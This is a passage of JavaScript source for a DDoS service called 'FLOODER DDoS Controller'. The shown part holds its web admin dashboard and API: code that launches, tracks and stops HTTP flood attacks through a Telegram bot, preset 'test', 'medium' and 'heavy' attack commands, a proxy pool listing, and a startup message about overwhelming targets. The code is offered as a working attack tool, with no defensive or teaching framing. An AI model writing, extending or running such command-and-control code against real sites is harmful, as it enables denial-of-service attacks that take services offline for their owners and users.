                body { background: #0a0a0a; color: #00ffff; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
                .container { max-width: 1400px; margin: 0 auto; }
                .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #00ffff; padding-bottom: 10px; }
                h1 { color: #00ffff; font-size: 36px; margin: 0; }
                .admin-badge { background: #00ffff; color: #000; padding: 5px 15px; border-radius: 3px; font-weight: bold; }
                .logout-btn { background: #ff4444; color: white; padding: 8px 20px; text-decoration: none; border-radius: 5px; margin-left: 10px; }
                .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                .stat-card { border: 1px solid #00ffff; padding: 15px; border-radius: 5px; text-align: center; background: rgba(0, 255, 255, 0.1); }
                .stat-value { font-size: 32px; font-weight: bold; color: #00ffff; }
                .main-panel { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
                .panel { border: 1px solid #00ffff; border-radius: 5px; padding: 20px; background: rgba(0, 255, 255, 0.05); }
                .command-input { width: 100%; padding: 12px; background: #222; border: 1px solid #00ffff; color: #00ffff; font-family: 'Courier New', monospace; border-radius: 5px; margin-bottom: 10px; }
                .command-btn { background: #00ffff; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-right: 10px; }
                .command-output { background: #111; border: 1px solid #333; border-radius: 5px; padding: 15px; margin-top: 15px; max-height: 300px; overflow-y: auto; color: #00ff00; }
                .attack-item { border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; background: rgba(0, 255, 255, 0.05); }
                .progress-bar { width: 100%; height: 20px; background: #333; border-radius: 10px; overflow: hidden; margin: 10px 0; }
                .progress-fill { height: 100%; background: #00ffff; transition: width 0.3s; }
                .attack-controls button { background: #444; color: #00ffff; border: 1px solid #00ffff; padding: 5px 15px; border-radius: 3px; cursor: pointer; margin-right: 5px; }
                .blink { animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🌊 FLOODER ADMIN</h1>
                    <div>
                        <span class="admin-badge">👑 ADMIN</span>
                        <a href="/" class="logout-btn" style="background:#333;">USER VIEW</a>
                        <a href="/logout" class="logout-btn">LOGOUT</a>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-value">${attacks.size}</div><div class="stat-label">Active</div></div>
                    <div class="stat-card"><div class="stat-value">${metrics.totalAttacks}</div><div class="stat-label">Total</div></div>
                    <div class="stat-card"><div class="stat-value">${(metrics.totalRequests / 1e6).toFixed(2)}M</div><div class="stat-label">Packets</div></div>
                    <div class="stat-card"><div class="stat-value">${proxyManager.getStats().active}</div><div class="stat-label">Proxies</div></div>
                </div>

                <div class="main-panel">
                    <div class="panel">
                        <h2>⚡ COMMAND TERMINAL</h2>
                        <input type="text" id="cmdInput" class="command-input" placeholder="/attack https://example.com 60 1000 50 random">
                        <button class="command-btn" onclick="execCmd()">EXECUTE</button>
                        <button class="command-btn" onclick="clearOutput()">CLEAR</button>
                        <div id="output" class="command-output">> Ready for commands...</div>
                    </div>
                    <div class="panel">
                        <h2>🚀 QUICK ACTIONS</h2>
                        <button class="command-btn" onclick="quickAttack('test')">TEST</button>
                        <button class="command-btn" onclick="quickAttack('medium')">MEDIUM</button>
                        <button class="command-btn" onclick="quickAttack('heavy')">HEAVY</button>
                        <button class="command-btn" onclick="stopAll()">STOP ALL</button>
                        <button class="command-btn" onclick="showProxies()">PROXIES</button>
                        <div style="margin-top:20px;">
                            <h3>System</h3>
                            <div>Uptime: ${hours}h ${minutes}m</div>
                            <div>CPU: ${os.cpus().length} cores</div>
                            <div>RAM: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB</div>
                        </div>
                    </div>
                </div>

                <h2>🎯 ACTIVE FLOODS</h2>
                <div id="attacks">
                    ${Array.from(attacks.entries()).map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        return `
                        <div class="attack-item">
                            <div><strong>ID:</strong> ${id.slice(-8)} | @${attack.username}</div>
                            <div>${attack.url.substring(0, 60)}...</div>
                            <div class="progress-bar"><div class="progress-fill" style="width: ${percent}%"></div></div>
                            <div>${percent}% | ${elapsed}s/${attack.duration}s | ${attack.requestCount.toLocaleString()} packets</div>
                            <div class="attack-controls">
                                <button onclick="stopAttack('${id}')">STOP</button>
                                <button onclick="showDetails('${id}')">DETAILS</button>
                            </div>
                        </div>
                        `;
                    }).join('')}
                </div>
            </div>

            <script>
                async function execCmd() {
                    const cmd = document.getElementById('cmdInput').value;
                    if (!cmd) return;
                    
                    const res = await fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: cmd})
                    });
                    const data = await res.json();
                    
                    const output = document.getElementById('output');
                    output.innerHTML = '> ' + cmd + '\\n' + data.output + '\\n\\n' + output.innerHTML;
                    document.getElementById('cmdInput').value = '';
                    setTimeout(() => location.reload(), 1000);
                }

                function quickAttack(type) {
                    const cmds = {
                        test: '/attack https://httpbin.org/get 30 100 10 random',
                        medium: '/attack https://httpbin.org/get 60 1000 50 square',
                        heavy: '/attack https://httpbin.org/get 120 5000 100 exponential'
                    };
                    document.getElementById('cmdInput').value = cmds[type];
                    execCmd();
                }

                async function stopAttack(id) {
                    await fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: '/stop ' + id})
                    });
                    location.reload();
                }

                async function stopAll() {
                    if (confirm('Stop all floods?')) {
                        await fetch('/api/command', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({command: '/stopall'})
                        });
                        location.reload();
                    }
                }

                async function showProxies() {
                    const res = await fetch('/api/proxies');
                    const data = await res.json();
                    const output = document.getElementById('output');
                    output.innerHTML = '> PROXIES\\n' + data.proxies.join('\\n') + '\\n\\n' + output.innerHTML;
                }

                function clearOutput() {
                    document.getElementById('output').innerHTML = '> Cleared...';
                }
            </script>
        </body>
        </html>
    `);
});

// Logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// API endpoints
app.post('/api/command', isAuthenticated, async (req, res) => {
    const { command } = req.body;
    commandHistory.push(command);
    
    try {
        const parts = command.split(' ');
        const cmd = parts[0].toLowerCase();
        let output = '';

        switch(cmd) {
            case '/attack':
                const [_, url, time, rate, threads, pattern] = parts;
                const fakeMsg = {
                    message: { text: command, chat: { id: ADMIN_ID }, from: { id: parseInt(ADMIN_ID), username: 'admin' } }
                };
                bot.commands.get('attack')(fakeMsg);
                output = `✅ Attack launched: ${url}`;
                break;
            case '/stop':
                const id = parts[1];
                const attack = attacks.get(id);
                if (attack) { attack.process.kill('SIGINT'); output = `✅ Stopped ${id}`; }
                else output = '❌ Not found';
                break;
            case '/stopall':
                attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
                attacks.clear();
                output = '✅ Stopped all';
                break;
            case '/stats':
                output = `Active: ${attacks.size}\nTotal: ${metrics.totalAttacks}\nPackets: ${metrics.totalRequests}`;
                break;
            case '/proxies':
                output = Array.from(proxyManager.proxies.keys()).join('\n');
                break;
            default:
                output = 'Unknown command';
        }
        res.json({ output });
    } catch (err) {
        res.json({ output: `Error: ${err.message}` });
    }
});

app.get('/api/proxies', (req, res) => {
    const proxies = Array.from(proxyManager.proxies.keys()).slice(0, 20);
    res.json({ proxies });
});

app.get('/api/attacks', (req, res) => {
    const list = Array.from(attacks.entries()).map(([id, a]) => ({
        id: id.slice(-8),
        url: a.url,
        elapsed: Math.floor((Date.now() - a.startTime) / 1000),
        duration: a.duration,
        packets: a.requestCount
    }));
    res.json({ attacks: list });
});

// Start server
app.listen(port, HOST, () => {
    console.log('\x1b[36m%s\x1b[0m', `🌐 Dashboard: http://localhost:${port}`);
    console.log('\x1b[36m%s\x1b[0m', `👤 User: http://localhost:${port}`);
    console.log('\x1b[36m%s\x1b[0m', `👑 Admin: http://localhost:${port}/login`);
    console.log('\x1b[36m%s\x1b[0m', `🔐 Password: ${ADMIN_PASSWORD}`);
});

// ========== START BOT ==========
console.log('\x1b[36m%s\x1b[0m', `\n🌊 FLOODER DDoS Controller v3.0`);
console.log('\x1b[36m%s\x1b[0m', `📱 Bot: @DDOSATTACK67_BOT`);
console.log('\x1b[36m%s\x1b[0m', `👑 Admin ID: ${ADMIN_ID}`);
console.log('\x1b[36m%s\x1b[0m', `⚡ Ready to overwhelm targets...\n`);

bot.launch()
    .then(() => console.log('✅ Bot is online!'))
    .catch(err => console.error('❌ Failed:', err.message));

// Graceful shutdown
process.once('SIGINT', () => {
    attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    process.exit(0);
});